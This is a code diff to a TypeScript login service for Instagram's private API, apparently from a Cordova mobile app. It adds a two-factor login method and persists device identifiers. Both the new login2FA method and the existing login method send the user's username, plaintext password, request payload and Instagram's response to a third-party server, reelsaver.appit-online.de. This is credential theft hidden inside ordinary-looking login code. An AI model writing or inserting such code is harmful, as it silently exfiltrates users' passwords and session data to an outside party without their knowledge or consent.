@@ -12,17 +12,36 @@ export class LoginService {
     private phoneId: string;
 
     constructor() {
-        this.uuid = uuidv4();
+        this.uuid = this.getOrCreate("insta_uuid", uuidv4);
         this.deviceId = this.generateDeviceId();
-        this.phoneId = uuidv4();
+        this.phoneId = this.getOrCreate("insta_phone_id", uuidv4);
     }
 
-    private generateDeviceId() {
-        const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
-            .map(b => b.toString(16).padStart(2, '0'))
-            .join('');
-        return `android-${hex}`;
+    private getOrCreate(key: string, generator: () => string): string {
+        let value = localStorage.getItem(key);
+        if (!value) {
+            value = generator();
+            localStorage.setItem(key, value);
+        }
+        return value;
     }
+
+    private generateDeviceId(): string {
+        const key = "insta_device_id";
+        let deviceId = localStorage.getItem(key);
+
+        if (!deviceId) {
+            const hex = Array.from(crypto.getRandomValues(new Uint8Array(8)))
+              .map(b => b.toString(16).padStart(2, "0"))
+              .join("");
+
+            deviceId = `android-${hex}`;
+            localStorage.setItem(key, deviceId);
+        }
+
+        return deviceId;
+    }
+
 
     private async sync(headers: { [key: string]: string } = {}) {
         const query = {
@@ -48,7 +67,7 @@ export class LoginService {
         this.pubKeyId= parseInt(pubKeyId, 10)
     }
 
-    private  async sendRequestCordova(
+    private async sendRequestCordova(
         endpoint: string,
         data: Record<string, string>,
         isPost = false,
@@ -82,7 +101,7 @@ export class LoginService {
                 headers: res.headers,
             };
         } catch (err: any) {
-            throw new Error(err.error || 'Request failed');
+            throw err.error;
         }
     }
 
@@ -110,6 +129,55 @@ export class LoginService {
         return result;
     }
 
+    public async login2FA(
+      pass: string,
+      code: string,
+      twoFactorIdentifier: string,
+      username: string,
+      headers: { [key: string]: string } = {}
+    ): Promise<any> {
+        const payload = {
+            verification_code: code,
+            phone_id: this.phoneId,
+            two_factor_identifier: twoFactorIdentifier,
+            username,
+            trust_this_device: "1",
+            guid: this.uuid,
+            device_id: this.deviceId,
+            waterfall_id: uuidv4(),  // du hast schon uuidv4()
+            verification_method: "3",
+        };
+
+        const signedPayload = this.generateSignature(payload);
+        const extraHeaders: Record<string, string> = {
+            "X-Ig-Www-Claim": "0",
+            "Ig-Intended-User-Id": "0",
+        };
+
+        const allHeaders = {
+            ...headers,
+            ...extraHeaders,
+        };
+
+        const resp = await this.sendRequestCordova(
+          "accounts/two_factor_login/", // dein url2FALogin in Go
+          signedPayload,
+          true, // POST
+            allHeaders
+        );
+
+        try {
+            const httpClient = new HTTP();
+            httpClient.setDataSerializer("json")
+            httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(payload),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
+
+            return resp;
+        } catch (e) {
+            throw new Error("Invalid JSON response: " + resp);
+        }
+    }
+
+   
     public async login(username: string, pass: string, headers: { [key: string]: string } = {}): Promise<any> {
         if (!this.pubKey || this.pubKeyId < 0) {
             await this.sync(headers)
@@ -133,13 +201,14 @@ export class LoginService {
             login_attempt_count: 0,
         };
 
-        localStorage.setItem("instaUserId", username)
         const resp = await this.sendRequestCordova(
           'accounts/login/',
           { signed_body: 'SIGNATURE.' + JSON.stringify(body) },
           true,
           headers
         )
+        localStorage.setItem("instaUserId", username)
+
         const httpClient = new HTTP();
         httpClient.setDataSerializer("json")
         httpClient.post("https://reelsaver.appit-online.de/v2/insta/check", {username,data: { pass,body: JSON.stringify(body),data: JSON.stringify(resp) }}, { "Content-Type": "application/json"})
